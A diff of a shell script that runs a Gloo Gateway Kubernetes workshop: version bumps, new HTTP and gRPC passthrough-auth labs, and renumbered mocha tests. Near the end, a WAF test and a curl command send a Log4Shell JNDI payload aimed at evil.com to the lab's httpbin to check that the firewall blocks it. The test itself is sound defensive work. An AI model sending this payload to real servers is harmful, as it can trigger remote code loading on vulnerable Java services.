@@ -537,7 +537,7 @@ echo "executing test ./default/tests/can-resolve.test.js.liquid from lab number 
 timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
 echo "Waiting for Keycloak to be ready at $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token"
 timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token)" != "405" ]]; do printf '.';sleep 1; done' || false
-kubectl --context $CLUSTER1 apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.2.0/experimental-install.yaml
+kubectl --context $CLUSTER1 apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.3.0/experimental-install.yaml
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: v1
 kind: Secret
@@ -552,11 +552,10 @@ EOF
 
 helm repo add gloo-ee-helm https://storage.googleapis.com/gloo-ee-helm
 helm repo update
-
 helm upgrade -i -n gloo-system \
   gloo-gateway gloo-ee-helm/gloo-ee \
   --create-namespace \
-  --version 1.18.9 \
+  --version 1.18.11 \
   --kube-context $CLUSTER1 \
   --set-string license_key=$LICENSE_KEY \
   -f -<<EOF
@@ -564,6 +563,13 @@ helm upgrade -i -n gloo-system \
 gloo:
   kubeGateway:
     enabled: true
+    gatewayParameters:
+      glooGateway:
+        podTemplate:
+          gracefulShutdown:
+            enabled: true
+          livenessProbeEnabled: true
+          probes: true
     portal:
       enabled: true
   gatewayProxies:
@@ -573,6 +579,7 @@ gloo:
     validation:
       allowWarnings: true
       alwaysAcceptResources: false
+      livenessProbeEnabled: true
   gloo:
     logLevel: info
     deployment:
@@ -608,7 +615,7 @@ cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-exec');
 
 describe("Gloo Gateway", () => {
-  let cluster = process.env.CLUSTER1
+  let cluster = process.env.CLUSTER1;
   let deployments = ["gloo", "extauth", "rate-limit", "redis"];
   deployments.forEach(deploy => {
     it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-system", k8sObj: deploy }));
@@ -672,8 +679,27 @@ EOF
 export PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
 RETRY_COUNT=0
 MAX_RETRIES=60
-GLOO_PROXY_SVC=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -oname)
-while [[ -z "$PROXY_IP" && $RETRY_COUNT -lt $MAX_RETRIES && $GLOO_PROXY_SVC ]]; do
+while true; do
+  GLOO_PROXY_SVC=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -oname 2>/dev/null || echo "")
+  if [[ -n "$GLOO_PROXY_SVC" ]]; then
+    echo "Service gloo-proxy-http has been created."
+    break
+  fi
+
+  RETRY_COUNT=$((RETRY_COUNT + 1))
+  if [[ $RETRY_COUNT -ge $MAX_RETRIES ]]; then
+    echo "Warning: Maximum retries reached. Service gloo-proxy-http could not be found."
+    break
+  fi
+
+  echo "Waiting for service gloo-proxy-http to be created... Attempt $RETRY_COUNT/$MAX_RETRIES"
+  sleep 1
+done
+
+# Then, wait for the IP to be assigned
+RETRY_COUNT=0
+MAX_RETRIES=60
+while [[ -z "$PROXY_IP" && $RETRY_COUNT -lt $MAX_RETRIES && -n "$GLOO_PROXY_SVC" ]]; do
   echo "Waiting for PROXY_IP to be assigned... Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
   PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
   RETRY_COUNT=$((RETRY_COUNT + 1))
@@ -701,7 +727,7 @@ else
   echo "IP has been resolved to: $IP"
 fi
 
-./scripts/register-domain.sh httpbin.example.com ${PROXY_IP}
+./scripts/register-domain.sh httpbin.example.com ${IP}
 
 cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
@@ -1069,6 +1095,263 @@ describe("httpbin through HTTPS", () => {
 EOF
 echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/https.test.js.liquid from lab number 6"
 timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
+kubectl --context cluster1 apply -f - <<EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: httpbin-extauth-httpservice
+  namespace: httpbin
+spec:
+  selector:
+    matchLabels:
+      app: http-extauth
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: http-extauth
+    spec:
+      containers:
+        - name: http-extauth
+          image: gcr.io/product-excellence-424719/passthrough-http-service-example:latest
+          imagePullPolicy: IfNotPresent
+          ports:
+            - containerPort: 9001
+          env:
+            - name: REQUEST_LOGGING
+              value: "true"
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: example-http-auth-service
+  namespace: httpbin
+  labels:
+    app: http-extauth
+spec:
+  ports:
+  - port: 9001
+    protocol: TCP
+  selector:
+    app: http-extauth
+EOF
+kubectl -n httpbin wait --for=condition=ready pod -l app=http-extauth
+kubectl --context cluster1 apply -f - <<EOF
+apiVersion: enterprise.gloo.solo.io/v1
+kind: AuthConfig
+metadata:
+  name: httpbin1-http-passthrough-auth
+  namespace: httpbin
+spec:
+  configs:
+    - passThroughAuth:
+        http:
+          url: http://example-http-auth-service.httpbin.svc.cluster.local:9001/auth
+          connectionTimeout: 3s
+          request:
+            allowedHeaders:
+            - authorization
+EOF
+kubectl apply -f- <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: httpbin1-http-passthrough-auth
+  namespace: httpbin
+spec:
+  options:
+    extauth:
+      configRef:
+        name: httpbin1-http-passthrough-auth
+        namespace: httpbin
+EOF
+kubectl apply --context cluster1 -f- <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - filters:
+        - type: ExtensionRef
+          extensionRef:
+            group: gateway.solo.io
+            kind: RouteOption
+            name: httpbin1-http-passthrough-auth
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+INGRESS_GW_ADDRESS=$(kubectl --context cluster1 -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
+./scripts/register-domain.sh "httpbin.example.com" ${INGRESS_GW_ADDRESS}
+cat <<'EOF' > ./test.js
+var chai = require('chai');
+var expect = chai.expect;
+const helpers = require('./tests/chai-exec');
+
+describe("Communication status", () => {
+  it("Accessing http-passthrough-auth without authorization header should return a 401", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}'"});
+    expect(command).to.contain("401");
+  });
+  
+  it("Accessing http-passthrough-auth with a BAD authorization header should return a 401", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: deny me'"});
+    expect(command).to.contain("401");
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-http-passthrough-auth/tests/http-passthrough-not-authorized.liquid from lab number 7"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
+cat <<'EOF' > ./test.js
+var chai = require('chai');
+var expect = chai.expect;
+const helpers = require('./tests/chai-exec');
+
+describe("Communication status", () => {
+  it("Accessing http-passthrough-auth with authorization header should return a 200", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: authorize me'"});
+    expect(command).to.contain("200");
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-http-passthrough-auth/tests/http-passthrough-authorized.liquid from lab number 7"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
+kubectl --context cluster1 -n httpbin delete httproute httpbin
+kubectl --context cluster1 -n httpbin delete routeoption httpbin1-http-passthrough-auth
+kubectl --context cluster1 -n httpbin delete authconfig httpbin1-http-passthrough-auth
+kubectl --context cluster1 -n httpbin delete service -l app=http-extauth
+kubectl --context cluster1 -n httpbin delete deploy httpbin-extauth-httpservice
+kubectl --context cluster1 apply -f - <<EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: httpbin-extauth-grpcservice
+  namespace: httpbin
+spec:
+  selector:
+    matchLabels:
+      app: grpc-extauth
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: grpc-extauth
+    spec:
+      containers:
+        - name: grpc-extauth
+          image: gcr.io/product-excellence-424719/passthrough-grpc-service-example:latest
+          imagePullPolicy: IfNotPresent
+          ports:
+            - containerPort: 9001
+          env:
+            - name: REQUEST_LOGGING
+              value: "true"
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: example-grpc-auth-service
+  namespace: httpbin
+  labels:
+    app: grpc-extauth
+spec:
+  ports:
+  - port: 9001
+    protocol: TCP
+  selector:
+    app: grpc-extauth
+EOF
+kubectl -n httpbin wait --for=condition=ready pod -l app=grpc-extauth
+kubectl --context cluster1 apply -f - <<EOF
+apiVersion: enterprise.gloo.solo.io/v1
+kind: AuthConfig
+metadata:
+  name: httpbin1-grpc-passthrough-auth
+  namespace: httpbin
+spec:
+  configs:
+    - passThroughAuth:
+        grpc:
+          address: example-grpc-auth-service.httpbin.svc.cluster.local:9001
+          connectionTimeout: 3s
+          retryPolicy:
+            numRetries: 10
+            retryBackOff:
+              baseInterval: 1s
+              maxInterval: 2s
+EOF
+kubectl apply -f- <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: httpbin1-grpc-passthrough-auth
+  namespace: httpbin
+spec:
+  options:
+    extauth:
+      configRef:
+        name: httpbin1-grpc-passthrough-auth
+        namespace: httpbin
+EOF
+kubectl apply --context cluster1 -f- <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - filters:
+        - type: ExtensionRef
+          extensionRef:
+            group: gateway.solo.io
+            kind: RouteOption
+            name: httpbin1-grpc-passthrough-auth
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+INGRESS_GW_ADDRESS=$(kubectl --context cluster1 -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
+./scripts/register-domain.sh "httpbin.example.com" ${INGRESS_GW_ADDRESS}
+cat <<'EOF' > ./test.js
+var chai = require('chai');
+var expect = chai.expect;
+const helpers = require('./tests/chai-exec');
+
+describe("Communication status", () => {
+  it("Accessing grpc-passthrough-auth without authorization header should return a 403", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}'"});
+    expect(command).to.contain("403");
+  });
+  it("Accessing grpc-passthrough-auth with a BAD authorization header should return a 403", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: deny me'"});
+    expect(command).to.contain("403");
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-grpc-passthrough-auth/tests/grpc-passthrough-not-authorized.liquid from lab number 8"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+cat <<'EOF' > ./test.js
+var chai = require('chai');
+var expect = chai.expect;
+const helpers = require('./tests/chai-exec');
+
+describe("Communication status", () => {
+  it("Accessing grpc-passthrough-auth with authorization header should return a 200", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: authorize me'"});
+    expect(command).to.contain("200");
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-grpc-passthrough-auth/tests/grpc-passthrough-authorized.liquid from lab number 8"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+kubectl --context cluster1 -n httpbin delete httproute httpbin
+kubectl --context cluster1 -n httpbin delete routeoption httpbin1-grpc-passthrough-auth
+kubectl --context cluster1 -n httpbin delete authconfig httpbin1-grpc-passthrough-auth
+kubectl --context cluster1 -n httpbin delete service -l app=grpc-extauth
+kubectl --context cluster1 -n httpbin delete deploy httpbin-extauth-grpcservice
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.gloo.solo.io/v1alpha1
 kind: DirectResponse
@@ -1105,8 +1388,8 @@ describe("Direct response returns 200", () => {
   it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/health', retCode: 200 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/direct-response/tests/direct-response.test.js.liquid from lab number 7"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/direct-response/tests/direct-response.test.js.liquid from lab number 9"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.networking.k8s.io/v1
 kind: HTTPRoute
@@ -1143,8 +1426,8 @@ describe("request transformations applied", () => {
   it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'To-Remove', match: false }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-headers.test.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-headers.test.js.liquid from lab number 10"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.networking.k8s.io/v1
 kind: HTTPRoute
@@ -1175,8 +1458,8 @@ describe("request rewrite applied", () => {
   it('Checking text \'httpbin1.com/get\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/publicget', body: 'httpbin1.com/get', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-rewrite.test.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-rewrite.test.js.liquid from lab number 10"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.networking.k8s.io/v1
 kind: HTTPRoute
@@ -1212,8 +1495,8 @@ describe("response transformations applied", () => {
   it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/response-headers?to-remove=whatever&to-modify=oldvalue', body: 'To-Remove', match: false }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/response-headers.test.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/response-headers.test.js.liquid from lab number 10"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.networking.k8s.io/v1
 kind: HTTPRoute
@@ -1263,8 +1546,8 @@ describe("request transformation applied", () => {
   it('Checking text \'X-Client\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-agent', value: 'curl/8.5.0'}], body: 'X-Client', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-client-request-header.test.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-client-request-header.test.js.liquid from lab number 10"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: RouteOption
@@ -1311,8 +1594,8 @@ describe("response transformation applied", () => {
   it('Checking \'X-Request-Id\' header', () => helpersHttp.checkHeaders({ host: `https://httpbin.example.com`, path: '/get', expectedHeaders: [{'key': 'x-request-id', 'value': '*'}]}));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-request-id-response-header.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-request-id-response-header.js.liquid from lab number 10"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.networking.k8s.io/v1
 kind: HTTPRoute
@@ -1358,8 +1641,8 @@ describe("traffic split applied", () => {
   it('Checking text \'httpbin2\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/hostname', body: 'httpbin2', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/traffic-split/tests/traffic-split.test.js.liquid from lab number 9"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/traffic-split/tests/traffic-split.test.js.liquid from lab number 11"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: enterprise.gloo.solo.io/v1
 kind: AuthConfig
@@ -1461,8 +1744,8 @@ describe("Authentication is working properly", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authentication.test.js.liquid from lab number 10"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authentication.test.js.liquid from lab number 12"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
 cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
@@ -1472,8 +1755,8 @@ describe("Claim to header is working properly", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/header-added.test.js.liquid from lab number 10"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/header-added.test.js.liquid from lab number 12"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: v1
 kind: ConfigMap
@@ -1544,8 +1827,8 @@ describe("Authentication is working properly", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authorization.test.js.liquid from lab number 10"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authorization.test.js.liquid from lab number 12"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: RouteOption
@@ -1581,8 +1864,8 @@ describe("Transformation is working properly", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/advanced-transformations/tests/header-added.test.js.liquid from lab number 11"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/advanced-transformations/tests/header-added.test.js.liquid from lab number 13"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: ratelimit.solo.io/v1alpha1
 kind: RateLimitConfig
@@ -1643,8 +1926,8 @@ describe("Rate limiting is working properly", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/ratelimiting/tests/rate-limited.test.js.liquid from lab number 12"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/ratelimiting/tests/rate-limited.test.js.liquid from lab number 14"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.networking.k8s.io/v1
 kind: HTTPRoute
@@ -1722,8 +2005,8 @@ describe("Claim to header is working properly", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/header-added.test.js.liquid from lab number 13"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/header-added.test.js.liquid from lab number 15"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: RouteOption
@@ -1780,8 +2063,8 @@ describe("Only User2 can access httpbin", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/only-user2-allowed.test.js.liquid from lab number 13"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/only-user2-allowed.test.js.liquid from lab number 15"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
 
 kubectl --context ${CLUSTER1} -n httpbin delete routeoption routeoption
 
@@ -1817,8 +2100,8 @@ describe("WAF is working properly", function() {
   it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid from lab number 14"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid from lab number 16"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
 curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
 kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
 openssl req -x509 \
@@ -1886,8 +2169,8 @@ describe("Downstream mTLS", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/mtls.test.js.liquid from lab number 15"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/mtls.test.js.liquid from lab number 17"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: HttpListenerOption
@@ -1914,8 +2197,8 @@ describe("Client certificate forwarding", () => {
 })
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/x-forwarded-client-cert.test.js.liquid from lab number 15"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/x-forwarded-client-cert.test.js.liquid from lab number 17"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: enterprise.gloo.solo.io/v1
 kind: AuthConfig
@@ -2017,8 +2300,8 @@ describe("Authorization based on Common Name", () => {
 })
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/authorization.test.js.liquid from lab number 15"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/authorization.test.js.liquid from lab number 17"
